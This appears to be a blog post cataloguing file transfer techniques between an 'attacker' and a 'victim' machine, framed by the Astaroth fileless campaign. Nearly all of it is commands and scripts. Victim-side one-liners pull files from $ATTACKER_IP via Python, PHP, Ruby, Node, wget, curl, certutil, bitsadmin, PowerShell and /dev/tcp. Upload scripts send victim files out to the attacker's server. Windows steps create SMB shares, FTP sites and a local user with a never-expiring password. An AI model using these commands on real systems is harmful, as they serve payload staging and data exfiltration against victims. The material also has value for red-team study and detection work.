--- 
title: "File Transfer Techniques"
author: ""
date: 2023-10-03T15:02:13+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
I recently read about the [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/), which at first I thought of as show off of technical prowess; why the heck would you use several utilities for just file download in a campaign? Well, Astaroth Attack got me thinking. This craft is one of wit and intellect. In almost all successful campaigns, success is measured by the attacker's thought process. How well they understood the situation and used existing resources at their disposal to advance their goal.

There are scenarios where one can leverage certain utilities based on how they work, or the tool being the only one at their disposal to fulfil their goal. So I set out to research how I could move files across systems using popular programming languages and utilities that mostly are installed by default in *nix or windows operating systems. I simulated an attacker and a victim machine with the file transfer technique categorised by the protocols used to accomplish it. You could however imagine having two machine with same or different operating system with the utility discussed installed on either machine.  

### HTTP SERVICE  
#### PYTHON3  
Python programming language is installed by default in most *nix operating systems.  
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
python3 -m http.server -b $ATTACKER_IP -d $FOLDERNAME_PATH $ATTACKER_PORT  # start the file download server with http library

## VICTIM MACHINE ##
python3 -c "import requests; open('$FILENAME', 'wb').write(requests.get('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME').content)"   # download the file with request library

python3 -c "import urllib.request; urllib.request.urlretrieve('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME', '$FILENAME')"  # download the file with urllib library
```
**File Upload Operation**
```shell
## ATTACKER MACHINE ##
# install uploadserver package and start a file upload server
python3 -m pip install uploadserver  # install uploadserver library
python3 -m uploadserver -b $ATTACKER_IP -d $ROOTFOLDER_PATH $ATTACKER_PORT  # start a file upload server

# write upload script and start a file upload server with it
tee -a uploadserver.py <<EOF
import argparse, http.server, socketserver, os
class UploadHandler(http.server.SimpleHTTPRequestHandler):
  def do_POST(self):
    if self.path == '/upload':
      self.send_response(204)
      self.end_headers()
      content_length = int(self.headers['Content-Length'])
      data = self.rfile.read(content_length)
      filename = self.headers.get('file', 'default.txt')
      filepath = os.path.join(os.getcwd(), filename)
      with open(filepath, 'wb') as file:
        file.write(data)

if __name__ == "__main__":
  parser = argparse.ArgumentParser(description="HTTP Server for File Uploads")
  parser.add_argument("--host", default="127.0.0.1", help="Server Host")
  parser.add_argument("--port", default=8000, type=int, help="Server Port")
  args = parser.parse_args()
  with socketserver.TCPServer((args.host, args.port), UploadHandler) as httpd:
    print(f"Serving at {args.host}:{args.port}")
    httpd.serve_forever()
EOF
python3 uploadserver.py --host 10.10.15.253 --port 8001  # start a file upload server with the script

## VICTIM MACHINE ##
python3 -c "import requests;requests.post('http://$ATTACKER_IP:$ATTACKER_PORT/upload',files={'files':open('$FILENAME','rb')})" # upload the file with request library for the uploadserver library file server

tee -a fileuploader.py <<EOF
import  argparse, http.client, os
def fileUploader(host, port, filename):
  with open(filename, "rb") as f:
    c = http.client.HTTPConnection(host, port)
    c.request("POST", "/upload", body=f, headers={"file": os.path.basename(filename), "Content-Length": str(os.path.getsize(filename))})
    print("File uploaded successfully" if c.getresponse().status == 204 else "Failed to upload file")
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP client for File Upload")
    parser.add_argument("--host", required=True, help="Server Host")
    parser.add_argument("--port", required=True, type=int, help="Server Port")
    parser.add_argument("--filename", required=True, help="File to Upload")
    args = parser.parse_args()

    fileUploader(args.host, args.port, args.filename)
EOF
python3 fileuploader.py --host $ATTACKER_IP --port $ATTACKER_PORT --filename $FILENAME  # upload the file with this script for the uploadserver script
```
#### PHP
It is estimated that nearly 70% of the web is powered by PHP. This makes PHP amongst the top utilities that can be found in operating systems.
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
php -S $ATTACKER_IP:$ATTACKER_PORT -t $ROOTFOLDER_PATH # start the file download server

## VICTIM MACHINE ##
php -r "readfile('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME');" > $FILENAME  # download the file with readfile function and redirect to file
php -r 'file_put_contents("$FILENAME", file_get_contents("http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME"));'  # download and save the file with file_get_contents and file_put_contents functions respectively.
```
**File Upload Operation**
```shell
## ATTACKER MACHINE ##
cat << 'EOF' > upload.php   # write upload script
<?php 
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) { 
  move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]); 
} 
?>
EOF
php -S $ATTACKER_IP:$ATTACKER_PORT upload.php  # start a file upload server with the script

## VICTIM MACHINE ##
# write the fileuploader script
cat << 'EOF' > fileuploader.php
<?php
if ($argc !== 4) { die("Usage: php send.php <server_ip> <server_port> <filename>\n"); }
$serverIP = $argv[1]; $serverPort = $argv[2]; $filename = $argv[3];
$url = "http://$serverIP:$serverPort/upload.php"; $boundary = uniqid();
$data = [
  "--$boundary",
  'Content-Disposition: form-data; name="file"; filename="' . basename($filename) . '"',
  'Content-Type: application/octet-stream', '', file_get_contents($filename),
  "--$boundary--"
];

$response = file_get_contents($url, false, stream_context_create([
  'http' => [
	'method' => 'POST',
	'header' => "Content-Type: multipart/form-data; boundary=$boundary",
	'content' => implode("\r\n", $data),
  ],
]));
?>
EOF
php fileuploader.php $ATTACKER_IP $ATTACKER_PORT $FILENAME # upload the file with this script for the upload script
```
#### RUBY
Ruby is also a popular programming language. Although not as prevalent as the earlier mentioned programming language.    
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
ruby -rwebrick -e "WEBrick::HTTPServer.new(DocumentRoot: '$ROOTFOLDER_PATH', BindAddress: '$ATTACKER_IP', Port: $ATTACKER_PORT).start" # start a file download server with webrick library
ruby -run -e httpd $ROOTFOLDER_PATH -b $ATTACKER_IP -p $ATTACKER_PORT # start a file download server with httpd library
ruby -rsinatra -e 'set :bind, "$ATTACKER_IP"; set :port, $ATTACKER_PORT; set :public_folder, "$ROOTFOLDER_PATH";'  # start a file download server with sinatra library

## VICTIM MACHINE ##
ruby -rnet/http -e "File.write('$FILENAME', Net::HTTP.get(URI.parse('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME')))"   # download the file with net/http library works for all servers
ruby -ropen-uri  -e "File.write('$FILENAME', URI.open('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME', 'rb').read)"  # download the file with open-uri library works for all servers

# write a client script to dowload files
tee -a filedownloader.rb <<EOF
require 'net/http'
host, port, filename = ARGV
abort "Usage: ruby filedownloader.rb <host> <port> <filename>" unless ARGV.length == 3
url = URI.parse("http://#{host}:#{port}/#{filename}")
response = Net::HTTP.get_response(url)
response.is_a?(Net::HTTPSuccess) ? File.write(filename, response.body) : exit("Failed to download '#{filename}'. status_code: #{response.code}")
EOF
ruby filedownloader.rb $ATTACKER_IP $ATTACKER_PORT $FILENAME  # download the file with client script works for all servers

gem install httpclient
ruby -rhttpclient -e "File.write('$FILENAME', HTTPClient.new.get_content('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME'))" # download the file with httpclient library works for all servers
```
**File Upload Operation**  
```shell
## ATTACKER MACHINE ##
ruby -rwebrick -e 's = WEBrick::HTTPServer.new(Port: 8008, BindAddress: "127.0.0.1"); s.mount_proc("/upload") { |req, res| index = req.body.index("Content-Type: application/octet-stream"); boundary_index = req.body.index("--", index); content = req.body[(index + "Content-Type: application/octet-stream".length)...(boundary_index - 2)].strip; filename = req.body.to_s[/Content-Disposition:.*filename="([^"]+)"/, 1]; File.open(filename, "wb") { |file| file.write(content) }; res.status = 204 }; s.start'  # start a file upload server with webrick

ruby -rsinatra -e 'require "json"; set :bind, "127.0.0.1"; set :port, 8008; post("/upload"){File.write(params["file"][:filename], params["file"][:tempfile].read); status 200}; Sinatra::Application.run'  # start a file upload server with sinatra

ruby -rsinatra -e 'require "json"; set :bind, "127.0.0.1"; set :port, 8008; post("/upload") { File.open(params["file"][:filename], "w") { |f| f.write(params["file"][:tempfile].read); status 200 }; "" }'  # start a file upload server with sinatra

## VICTIM MACHINE ## 
ruby -rhttpclient -e "HTTPClient.new.post(URI('http://$ATTACKER_IP:$ATTACKER_PORT/upload'), { 'file' => File.open('$FILENAME', 'rb') })"  # upload the file with httpclient

# write a fileuploader script
tee -a fileuploader.rb <<EOF
require 'net/http'

(ARGV.length < 3) ? (puts "Usage: ruby fileuploader.rb <host> <port> <filename>"; exit(1)) : nil
host, port, filename = ARGV
uri = URI("http://#{host}:#{port}/upload")

request = Net::HTTP::Post.new(uri)
form_data = [['file', File.open(filename, 'rb')]]
request.set_form(form_data, 'multipart/form-data')

response = Net::HTTP.start(uri.hostname, uri.port) { |http| http.request(request) } 
puts response.is_a?(Net::HTTPSuccess) ? "'#{filename}' Uploaded!" : "Upload Failed. Status Code: #{response.code}"
EOF
ruby fileuploader.rb $ATTACKER_IP $ATTACKER_PORT $FILENAME # upload the file with this script for sinatra server
```
#### NODE
Javascript is the language of the web and node is its server side implementation.
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
node -e "http.createServer((req, res) => { try { res.end(fs.readFileSync(__dirname + req.url)); console.log('Response Status Code:', res.statusCode); } catch (error) { console.error('Error:', error.message); } }).listen($ATTACKER_PORT, '$ATTACKER_IP');"

npm install node-static http-server -g  # install node-static and http-server
http-server -a $ATTACKER_IP -p $ATTACKER_PORT $ROOTFOLDER_PATH  # start a file download server with http-server library
static -a $ATTACKER_IP -p $ATTACKER_PORT $ROOTFOLDER_PATH  # start a file download server with static library

npm install express express-fileupload form-data --save  # install express framework
node -e "(e=require('express'))().use(e.static('$ROOTFOLDER_PATH')).listen($ATTACKER_PORT, '$ATTACKER_IP')"  # start a file download server with express library

## VICTIM MACHINE ## 
node -e "http.get('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME', (res) => { res.pipe(fs.createWriteStream('$FILENAME'));});"   # download the file with built-in http library works for all servers
```
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
node -e "require('express')().post('/upload', require('express-fileupload')(), (req, res) => req.files.file.mv('$FILENAME', err => res.send(err ? 'Upload Failed' : 'Upload Successful'))).listen($ATTACKER_PORT, '$ATTACKER_IP');"  # start a file upload server with express library

## VICTIM MACHINE ## 
node -e "f = new (require('form-data'))(); f.append('file', fs.createReadStream('$FILENAME')); f.submit('http://$ATTACKER_IP:$ATTACKER_PORT/upload', (err, res) => { err ? console.error(err) : res.pipe(process.stdout); });"  # upload the file with this form-data library for express server
```
#### Linux Utilities
Leveraging default or popularly installed Linux tools.
**File Download Operation**  
```shell
## ATTACKER MACHINE ## 
busybox httpd -f -p $ATTACKER_IP:$ATTACKER_PORT

## VICTIM MACHINE ## 
wget http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME   # download the file with wget for busybox file server utilities
curl http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME -o $FILENAME  # download the file with wget for busybox file server utilities
```
#### Windows Utilities
Leveraging default or popularly installed Windows tools.
**File Download Operation** 
```powershell
## ATTACKER MACHINE ## 
# write a filedownloader server script
echo @echo off 
echo '$listener = New-Object System.Net.HttpListener' >> filedownload.ps1
echo '$listener.Prefixes.Add("http://$ATTACKER_IP:$ATTACKER_PORT/")' >> filedownload.ps1
echo '$listener.Start()' >> filedownload.ps1
echo 'Write-Host "HTTP listener started."' >> filedownload.ps1
echo 'while ($listener.IsListening) { $context = $listener.GetContext(); $request = $context.Request; $response = $context.Response; $filePath = "$PWD$($request.Url.LocalPath -replace "/", "\")"; if (Test-Path -Path $filePath -PathType Leaf) { $fileContent = Get-Content -Path $filePath -Raw; $response.OutputStream.Write([Text.Encoding]::UTF8.GetBytes($fileContent), 0, $fileContent.Length); } else { $response.StatusCode = 404; $response.StatusDescription = "Not Found"; $response.OutputStream.Write([Text.Encoding]::UTF8.GetBytes("404 Not Found"), 0, 13); } $response.Close() }' >> filedownload.ps1
.\filedownload.ps1  # start a file download server with the script

## VICTIM MACHINE ## 
certutil.exe -urlcache -split -f "http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME" "$FILENAME"   # download the file with certutil 
iwr -uri "http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME" -outfile "$FILENAME"   # download the file with Invoke Web Request module
powershell -command {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME', '$FILENAME')}   # download the file with Web Client module
bitsadmin /transfer $JOBNAME /download /priority normal /dynamic 'http://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME' "$PWD\$FILENAME"   # download the file with bitsadmin utility
```
**File Upload Operation**  
```powershell
## ATTACKER MACHINE ## 
# write a uploadserver script
@'
$baseURL = "http://$ATTACKER_IP:$ATTACKER_PORT/"
$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add($baseURL)
$listener.Start()
Write-Host "Server is listening on $baseURL"

while ($true) {
  $context = $listener.GetContext()
  $request = $context.Request

  if ($request.HttpMethod -eq "POST" -and $request.Headers["Content-Type"] -like "multipart/form-data*") {
    $boundary = $request.Headers["Content-Type"].Split("=")[1]
    $reader = [System.IO.StreamReader]::new($request.InputStream)
    $content = $reader.ReadToEnd()

    # Split the content using the boundary to separate form fields and file data
    $parts = $content -split "--$boundary"

    foreach ($part in $parts) {
      if ($part -match "filename=""(.+)""") {
        $targetDirectory = "$env:USERPROFILE\Uploads"
        $fileSavePath = Join-Path -Path $targetDirectory -ChildPath $matches[1]
        if (-not (Test-Path -Path $targetDirectory)) {
          New-Item -ItemType Directory -Force -Path $targetDirectory
        }

        # Extract and save the file content as-is (raw binary)
        $fileContent = $part.Split([System.Environment]::NewLine, [System.StringSplitOptions]::RemoveEmptyEntries)[-1]
        [System.IO.File]::WriteAllBytes($fileSavePath, [System.Convert]::FromBase64String($fileContent))
        Write-Host "Upload saved as $fileSavePath"
      }
    }
  }
  $context.Response.Close()
}
$listener.Stop()
$listener.Close()
'@ | Set-Content -Path "uploadserver.ps1"
.\uploadserver.ps1  # start a file upload server with the script

# write an fileupload script
@'
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://$ATTACKER_IP:$ATTACKER_PORT/")
$listener.Start()
Write-Host "Listening for incoming requests..."

while ($listener.IsListening) {
  $context = $listener.GetContext()
  $request = $context.Request
  $response = $context.Response

  if ($request.HttpMethod -eq "POST") {
    $reader = New-Object System.IO.StreamReader($request.InputStream)
    $content = $reader.ReadToEnd()
    $reader.Close()

    $targetDirectory = "$env:USERPROFILE\Uploads"
    if (-not (Test-Path -Path $targetDirectory)) {
      New-Item -ItemType Directory -Force -Path $targetDirectory
    }

    $content | Out-File -FilePath "$targetDirectory\$FILENAME"
    Write-Host "Upload Successful."
    $response.Close()
  }
  else {
    Write-Host "Upload Failed."
    $response.Close()
  }
}
$listener.Stop()
'@ | Out-File -FilePath "fileupload.ps1"
.\fileupload.ps1  # start a file upload server with the script

## VICTIM MACHINE ##
@'
$filename = "$FILENAME"
$content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$filename"))
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Content-Type", "multipart/form-data;")
$webClient.UploadData("http://$ATTACKER_IP:$ATTACKER_PORT/", [System.Text.Encoding]::UTF8.GetBytes("--`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`nContent-Type: application/octet-stream`r`n`r`n$content`r`n--"))
'@ | powershell -command -  # upload the file with uploadserver.ps1 script

$response = Invoke-WebRequest -Uri "http://$ATTACKER_IP:$ATTACKER_PORT/" -Method Post -InFile "$FILENAME" -ContentType "multipart/form-data"; if ($response.StatusCode -eq 200) { "Upload Successful."} else { "Upload Failed." }  # upload the file with fileupload.ps1 script
```

### SMB SERVICE
Server Message Block is a file and resources sharing service.
#### Linux Utilities
**File Download Operation**  
```shell
## ATTACKER MACHINE ##
'NOTES
In attacking a windows victim machine with impacket-smbserver ensure the SMB server is started on port 445. This would require privileged user.
'
impacket-smbserver $SHARENAME $SHAREFOLDER -smb2support -ip $ATTACKER_IP -port $ATTACKER_PORT   # start smb server without authentication

impacket-smbserver $SHARENAME $SHAREFOLDER -smb2support -ip $ATTACKER_IP -port $ATTACKER_PORT -username $USERNAME -password $PASSWORD    # start smb2 server with authentication

## VICTIM MACHINE ## 
smbclient -N -L //$ATTACKER_IP/ -p $ATTACKER_PORT    # list share unauthenticated
smbclient -N //$ATTACKER_IP/$SHARENAME -p $ATTACKER_PORT -c '$SMB_COMMANDS' # run smb commands

smbclient -L -U '$USERNAME%$PASSWORD' $ATTACKER_IP -p $ATTACKER_PORT   # list share authenticated
smbclient //$ATTACKER_IP/$SHARENAME -p $ATTACKER_PORT -c '$SMB_COMMANDS' # run smb commands
```
#### Windows Utilities
**File Download Operation** 
```powershell
## ATTACKER MACHINE ##
# using cmd utilities
mkdir $SHAREFOLDER
net share $SHARENAME=$SHAREFOLDER /grant:Everyone,Full  # share the folder
icacls $SHAREFOLDER /grant Users:(OI)(CI)RX

# using powershell utilities
@'
$SharePath = "$SHAREFOLDER"
$ShareName = "$SHARENAME"
if (-not (Test-Path -Path $SharePath -PathType Container)) { New-Item -Path $SharePath -ItemType Directory }
New-SmbShare -Name $ShareName -Path $SharePath -FullAccess Everyone

$acl = Get-Acl $SharePath
$acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule("Users", "ReadAndExecute", "ContainerInherit, ObjectInherit", "None", "Allow")))
Set-Acl $SharePath $acl
'@ | powershell -command -

## VICTIM MACHINE ##
# using net utility
net use \\$ATTACKER_IP\$SHARENAME /user:$USERNAME $PASSWORD   # connect to the share with credentials 
dir \\$ATTACKER_IP\$SHARENAME\    # list content of the share
copy \\$ATTACKER_IP\$SHARENAME\$FILENAME [$env:USERPROFILE|$env:SYSTEMROOT|$PWD]    # copy file to specified location
net use \\$ATTACKER_IP\$SHARENAME /delete   # disconnect from the share 

# using New-SmbMapping module
New-SmbMapping -LocalPath $NAMED_DRIVE: -RemotePath \\$ATTACKER_IP\$SHARENAME -Username '$USERNAME' -Password '$PASSWORD'
Get-ChildItem -Path $NAMED_DRIVE:\
Copy-Item -Path $NAMED_DRIVE:\$FILENAME [$env:USERPROFILE|$env:SYSTEMROOT|$PWD]\$FILENAME
Remove-SmbMapping -LocalPath $NAMED_DRIVE:

# using New-PSDrive module
New-PSDrive -Name $NAMED_DISKNAME -PSProvider FileSystem -Root \\$ATTACKER_IP\$SHARENAME   # unauthenticated connection to smb server
$Password = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential('$USERNAME', $Password)  
New-PSDrive -Name $NAMED_DISKNAME -PSProvider FileSystem -Root \\$ATTACKER_IP\$SHARENAME -Credential $Credential   # authenticated connection to smb server
Set-Location -Path $NAMED_DISKNAME:    # change into the share folder
Get-ChildItem   # list share contents
Copy-Item -Path $FILENAME -Destination $env:USERPROFILE\$FOLDER\ # copy file to specified location
Set-Location -Path $env:USERPROFILE
Remove-PSDrive -Name $SHARENAME    # disconnect from the share
Get-SmbMapping   # list connected shares
```

### FTP SERVICE
File Transfer Protocol service is a file sharing service still widely in used.
#### Linux Utilities
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
pip install pyftpdlib    # install the library
python3 -m pyftpdlib -i $ATTACKER_IP -p $ATTACKER_PORT -u $USERNAME -P $PASSWORD -d $FOLDERNAME   # start ftp server with authentication and write access
python3 -m pyftpdlib -i $ATTACKER_IP -p $ATTACKER_PORT -d $FOLDERNAME   # start ftp server without authentication

## VICTIM MACHINE ##
wget -m --no-passive ftp://$USERNAME:$PASSWORD@$ATTACKER_IP:$ATTACKER_PORT/$FILENAME  
curl -s --user "$USERNAME:$PASSWORD" ftp://$ATTACKER_IP:$ATTACKER_PORT/$FILENAME -o $FILENAME
ftp -n $ATTACKER_IP $ATTACKER_PORT <<RUN
user $USERNAME $PASSWORD
get $FILENAME
RUN
```
#### Windows Utilities
**File Download Operation** 
```powershell
## ATTACKER MACHINE ##
# service verification and installation
Get-WindowsFeature -Name Web-Server, Web-Ftp-Server | Select-Object Name, Installed  # verify iis ftp is installed
Install-WindowsFeature -Name Web-Server, Web-Ftp-Server -IncludeManagementTools # install iis-ftp
Get-Service -Name "ftpsvc"  # show ftp status
Start-Service -Name "ftpsvc"  # start ftp service

# set variables
$SiteName = "myftp"
$PhysicalPath = "$env:SYSTEMDRIVE\inetpub\ftproot\exploit"
$Port = 21
$FTPGroup = "exploiters"
$FTPUser = "bugman"
$Password = "P2$$w0rD"

# create and add users to group
New-LocalUser -Name $FTPUser -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -PasswordNeverExpires -UserMayNotChangePassword  # create user
New-LocalGroup -Name $FTPGroup -Description "FTP Users Group"  # create group
Add-LocalGroupMember -Name $FTPGroup -Member $FTPUser  # add user to group
Get-LocalGroupMember -Group $FTPGroup  # verify user exist in group

# create folder, configure and start ftp site
if (-not (Test-Path -Path $PhysicalPath -PathType Container)) { New-Item -Path $PhysicalPath -ItemType Directory }  # create the ftp shared folder
New-WebFtpSite -Name $SiteName -Port $Port -PhysicalPath $PhysicalPath -Verbose -Force  # create the ftp site

if (Test-Path "IIS:\Sites\$SiteName") { 
  Set-ItemProperty -Path "IIS:\Sites\$SiteName" -Name "ftpserver.security.authentication.basicauthentication.enabled" -Value $true
}  # enable basic authentication

$AuthZParam = @{
  PSPath = 'IIS:\'
  Location = $SiteName
  Filter    = '/system.ftpserver/security/authorization'
  Value   = @{ accesstype = 'Allow'; users = $FTPUser; roles = $FTPGroup; permissions = 3 }
}
Add-WebConfiguration @AuthZParam  # authorize users in the group to access FTP site

'ftpServer.security.ssl.controlChannelPolicy', 'ftpServer.security.ssl.dataChannelPolicy' | ForEach-Object { 
  Set-ItemProperty -Path "IIS:\Sites\$SiteName" -Name $_ -Value 0
}  # set FTP SSL policy to permissive level - 0: Allow SSL 1: Require SSL 2: Custom

# grant permissions to the FTP shared folder
$ACLObject = Get-Acl -Path $PhysicalPath
$ACLObject.SetAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($FTPGroup, "ReadAndExecute", "ContainerInherit, ObjectInherit", "None", "Allow")))
Set-Acl $PhysicalPath $ACLObject
Get-Acl -Path $PhysicalPath | ForEach-Object Access  # verify assigned permissions
IISReset  # restart IIS service

# verify installation
Get-WebSite -Name $SiteName
Get-NetTCPConnection -LocalPort  21
Test-NetConnection -ComputerName "$env:ComputerName" -Port 21

## VICTIM MACHINE #
# creating and running FTP script
echo @echo off 
echo 'open $ATTACKER_IP 21' >> $SCRIPT_FILENAME
echo '$USERNAME' >> $SCRIPT_FILENAME
echo '$PASSWORD' >> $SCRIPT_FILENAME
echo 'get $FILENAME' >> $SCRIPT_FILENAME
echo 'quit' >> $SCRIPT_FILENAME
ftp -i -s:$SCRIPT_FILENAME

Set-Content -Path "$SCRIPT_FILENAME" -Value (Get-Content -Path "$SCRIPT_FILENAME" | ForEach-Object { $_ -replace "$CURRENT_TEXT", "$NEW_TEXT" }) # modifying the script and re-running FTP command

# using powershell
@'
$webClient = New-Object System.Net.WebClient
$webClient.Credentials = New-Object System.Net.NetworkCredential($USERNAME, $PASSWORD)
$webClient.DownloadFile('ftp://$ATTACKER_IP:21/$FILENAME', '$FILENAME')
'@ | powershell -c -
```
### OS NATIVE TOOLS
#### Linux Utilities
**File Download Operation** 
```shell
## ATTACKER MACHINE ##
ncat -i 5 -l $ATTACKER_IP $ATTACKER_PORT < '$FILENAME'  # start a file download server with ncat utility
socat -dd TCP-LISTEN:$ATTACKER_PORT,bind=$ATTACKER_IP,fork OPEN:$FILENAME  # start a file download server with socat utility
base64 $FILENAME -w 0 | xclip -selection clipboard && md5sum $FILENAME  # encode file, save to clipboard and generate file hash 

## VICTIM MACHINE #
tee -a $FILENAME < /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT  # download the file with tee for ncat and socat file server utilities
socat - TCP4:$ATTACKER_IP:$ATTACKER_PORT > $FILENAME  # download the file with socat for ncat and socat file server utilities
xclip -selection clipboard -o | base64 --decode > $FILENAME; echo "$COPIED_HASH $FILENAME" | md5sum -c  # decode clipboard content, save to file, and verify the file hash
```

#### Windows Utilities
**File Download Operation** 
```powershell
## ATTACKER MACHINE ##
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$PATH\$FILENAME")) | Set-Clipboard
Get-FileHash $FILENAME -Algorithm md5 | Select-Object -ExpandProperty Hash

## VICTIM MACHINE #
$base64String = Get-Clipboard -Format Text
[IO.File]::WriteAllBytes("$PWD\$FILENAME", [Convert]::FromBase64String($base64String))
if ((Get-FileHash $FILENAME -Algorithm md5).Hash -eq "$COPIED_HASH") { "OK" } else { "Failed" }
```